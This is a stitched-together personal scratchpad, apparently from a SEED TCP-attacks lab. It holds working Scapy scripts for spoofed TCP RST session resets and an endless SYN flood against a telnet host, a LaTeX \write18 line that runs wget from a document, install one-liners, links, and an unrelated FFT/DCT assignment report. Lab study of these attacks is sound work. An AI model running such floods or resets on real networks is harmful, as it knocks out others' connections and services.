sudo tshark -i br-818275ff5b0a -f "tcp and port 23" -o tcp.relative_sequence_numbers:FALSE -w /tmp.pcap -T fields -e frame.number -e tcp.seq -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e tcp.ack -e frame.time_epoch

tee /home/seed/Lab2/volumes/reset.py <<-'EOF'
#!/usr/bin/env python3
from scapy.all import *
import sys
print(sys.argv)
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=int(sys.argv[1]), dport=23, flags="R", seq=int(sys.argv[2]))
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
EOF


netstat -tna | grep SYN_RECV | wc -l
ss -n state syn-recv sport = :23 | wc -l
docker exec -it seed-attacker python3 /volumes/reset.py 46112 4217598685

tee /home/seed/Lab2/volumes/resetauto.py <<-'EOF'
#!/usr/bin/env python3
#!/usr/bin/python3
from scapy.all import *
def spoof_tcp(pkt):
   IPLayer  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
   TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
                  dport=pkt[TCP].sport, sport=pkt[TCP].dport)
   spoofpkt = IPLayer/TCPLayer
   ls(spoofpkt)
   send(spoofpkt, verbose=0)
pkt=sniff(iface='br-3cba7ed65b16', filter='tcp and port 23', prn=spoof_tcp) #br-3cba7ed65b16
EOF

tee /home/seed/Lab2/volumes/synflood.py <<-'EOF'
#!/usr/bin/env python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
ip = IP(dst="10.9.0.5")      # victim
tcp = TCP(dport=23, flags='S')      # 23 for telnet
pkt = ip/tcp
while True:
      pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
      pkt[TCP].sport = getrandbits(16) # source port
      pkt[TCP].seq = getrandbits(32) # sequence number
      send(pkt, iface = 'br-3cba7ed65b16' , verbose = 0)   # br-3cba7ed65b16
EOF

dmesg -Hkw
unzip -d -r nf



type -p curl >/dev/null || (sudo apt update && sudo apt install curl -y)
curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg \
&& sudo chmod go+r /usr/share/keyrings/githubcli-archive-keyring.gpg \
&& echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null \
&& sudo apt update \
&& sudo apt install gh -y

https://drive.google.com/file/d/1A1IGuzwAtqnw95Y69VUC6CqK_GpIs-01/view
https://drive.google.com/file/d/1e4MIqcsDaMyreMu9-F6RnDc63cNbNs4A/view?pli=1
https://blog.csdn.net/qq_39852676/article/details/131352226


sudo insmod hello.ko
modinfo hello
lsmod | grep hello

sudo rmmod hello
https://chrome.google.com/webstore/detail/awesome-chatgpt-screensho/nlipoenfbbikpbjkfpfillcgkoblgpmj?utm_source=app-launcher
https://chrome.google.com/webstore/detail/immersive-translate/bpoadfkcbjbfhfodiogcnhhhpibjhbnh?utm_source=app-launcher

curl -o src-cloud.zip https://seed.nyc3.cdn.digitaloceanspaces.com/src-cloud.zip&&sudo apt update&&sudo apt -y install unzip&&unzip src-cloud.zip&&cd src-cloud&&./install.sh

wget https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/Labsetup.zip&&unzip Labsetup.zip&&cd Labsetup

sudo add-apt-repository -y ppa:wireshark-dev/stable
sudo apt install -y tshark
sudo tshark -i br-818275ff5b0a -f "tcp and port 23" -o tcp.relative_sequence_numbers:FALSE -w /tmp.pcap -T fields -e frame.number -e tcp.seq -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e tcp.ack -e frame.time_epoch


git clone https://github.com/rjofccs/webssh.git&&cd webssh&&docker-compose up -d
https://coder.com/docs/code-server/latest/install#debian-ubuntu
tee reset.py <<-'EOF'
#!/usr/bin/env python3
from scapy.all import *
import sys
print(sys.argv)
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=int(sys.argv[1]), dport=23, flags="R", seq=int(sys.argv[2]))
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
EOF















https://www.papeeria.com/p/0940d65a-981c-4726-aca2-bedabaf49ee4#/main.tex

https://raw.githubusercontent.com/rjofccs/ds2023/main/test3.png

\documentclass{article}
\usepackage{graphicx} % includegraphics command is implemented here
\begin{document}

\write18{wget http://www.some-site.com/path/to/image.png}
\includegraphics{image.png}

\end{document}


\documentclass[a4paper]{article}

\usepackage[english]{babel}
\usepackage[utf8x]{inputenc}
\usepackage{amsmath}
\usepackage{graphicx}
\usepackage[colorinlistoftodos]{todonotes}
\usepackage[margin=1.2in]{geometry}

\title{Programming Assignment - 3}
\author{Niraj J. Dedhia}
\date{March 14, 2016}

\begin{document}
\maketitle

\begin{abstract}
In this programming assignment we were supposed to understand the concepts of FFT, Inverse FFT, DCT, Inverse DCT, Hybrid Image, Cooleyâ€“Tukey algorithm and visualization. 
\end{abstract}

\section{Summary}

This assignment was divided in four parts. 1) Implementation of DFT, IDFT using Cooley Tukey algorithm , 2) Visualization part. 3) Implementation to create Hybrid Image and 4) Implementation of DCT which was for bonus marks. 

\section{Methodology}

\subsection{DFT and IDFT}
Fast Fourier Transform(FFT) algorithm computes the Discrete Fourier transform (DFT) of a sequence. FFT converts the signal from one domain to the frequency domain and IFFT converts the signal from frequency domain to the space or time domain. I have implemented Cooley Tukey algorithm for computation of FFT and IFFT for 1D and 2D. Following are the formulas for FFT1D and IFFT1D and steps for Implementation of FFT2D-IFFT2D.
$Original image = IFFT2D( FFT2D ( original image ) )$

\begin{center}
\includegraphics[width=0.9\textwidth]{fft_for.png}

$Figure 1 : FFT and IFFT Formula$
\end{center}

\begin{itemize}
\item Read an image converted it in to gray-scale and double.
\item Perform FFT for each row in Image.
\item Take transpose of Image.
\item Again perform FFT over each row in an Image (i.e. column transformation).
\item Take transpose of Image and this is the final result.
\item For inverse FFT perform the same steps the only difference is instead of FFT perform IFFT.
\end{itemize}

\begin{center}
\includegraphics[width=0.9\textwidth]{hybrid.png}

$Figure 2 : Original Image --> FFT --> IFFT$
\end{center}

\subsection{Hybrid Image}
Two images are combined in a way that resultant image after combining them looks different based on the viewing distance. Here I have taken two images 1) Dog and 2) Cat and created hybrid image (figure 2) by applying following algorithm. 
\begin{itemize}
\item Read two images converted it in to gray-scale and double.
\item Padded images with the nearest value of power of 2.
\item Defined Gaussian low pass and high pass filers of size of padded images.
\item Took DFT of Images and filters.
\item Performed element wise multiplication of first image with high pass filter and second image with low pass filter and performed(A) .
\item Subtracted the high frequency image with its original image (B).
\item Add both the images (A + B).
\item Removed the padding and displayed it.
\end{itemize}

\begin{center}
\includegraphics[width=0.6\textwidth]{fft.png}

$Figure 3 : Hybrid Image$
\end{center}

\subsection{Visualization}
We were supposed to fill the stub with our implementation for showing the flaw how this FFT will turned in to IFFT, pixel by pixel visualization of conversion of FFT to IFFT. There are total six components a) Original Image, b) Log magnitude of DFFT of image, c) Used DFFT from 'b' component, d) Current component inserted in a component 'c' e) Scaled sine of component 'd', f) Inverse DFFT of Used DFFT component. Following are the steps for visualization.

\begin{itemize}
\item Read an image convert it in to gray-scale and double displayed that in first component.
\item Computed DFFT of input image and calculated the log10 of its magnitude. Then normalized it and displayed in component 2.
\item Perform the following steps iteratively for continuous visualization.
\item Searched maximum value from 'b' component(Brightest pixel value) and inserted it in component 'c' (This is also log magnitude value).
\item Took inverse DFT of de-normalized Used DFFT component. Displayed it in 'f' component.
\item For every iterations initialized the current component and scaled sine component.
\item Took the current used pixels and display it in 'd' component.
\item Computed the inverse DFFT of current component and displayed it in 'e' component. 
\end{itemize}

\begin{center}
\includegraphics[width=0.9\textwidth]{visu.png}

$Figure 4 : Visualization (After Few Iterations)$
\end{center}


\subsection{DCT and IDCT}
Discrete cosine transform(DCT) expresses a finite sequence of data points in terms of a sum of cosine functions keep changing at different frequencies. Its easy as it deals with real part only. Following are the formulas for DCT1D and IDCT1D and steps for Implementation of DCT2D-IDCT2D.
$Original image = IDCT2D( DCT2D ( original image ) )$

\begin{center}
\includegraphics[width=0.9\textwidth]{dct_for.png}

$Figure 5 : DCT and IDCT Formula$
\end{center}

\begin{itemize}
\item Read an image converted it in to gray-scale and double.
\item Perform DCT for each row in Image.
\item Take transpose of Image.
\item Again perform DCT over each row in an Image (i.e. column transformation).
\item Take transpose of Image and store it as the final result.
\item For inverse DCT perform the same steps the only difference is instead of DCT perform IDCT.
\end{itemize}

\begin{center}
\includegraphics[width=0.9\textwidth]{dct.png}

$Figure 6 : Original Image --> DCT --> IDCT$
\end{center}


\section{ References:}
$
[1] https://en.wikipedia.org/wiki/Discrete_Fourier_transform.   
\newline
[2] https://en.wikipedia.org/wiki/Hybrid_image.
\newline
[3] https://en.wikipedia.org/wiki/Discrete_cosine_transform.
\newline
[4] http://ieeexplore.ieee.org.ezproxy.rit.edu/stamp/stamp.jsp.
\newline
[5] http://www.mathworks.com/help/ .
\newline
[6] https://www.overleaf.com .
$
\end{document}

